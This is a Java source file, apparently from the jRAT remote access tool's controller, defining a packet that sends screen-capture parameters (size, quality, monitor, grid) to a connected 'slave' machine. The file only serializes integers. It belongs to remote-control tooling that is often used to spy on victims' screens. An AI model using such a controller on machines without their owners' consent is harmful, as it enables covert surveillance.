package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet12RemoteScreen extends AbstractOutgoingPacket {

	private int size;
	private int quality;
	private int monitor;
	private int columns;
	private int rows;

	public Packet12RemoteScreen(int size, int quality, int monitor, int columns, int rows) {
		this.size = size;
		this.quality = quality;
		this.monitor = monitor;
		this.columns = columns;
		this.rows = rows;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeInt(size);
		slave.writeInt(quality);
		slave.writeInt(monitor);
		slave.writeInt(columns);
		slave.writeInt(rows);
	}

	@Override
	public short getPacketId() {
		return 12;
	}

}
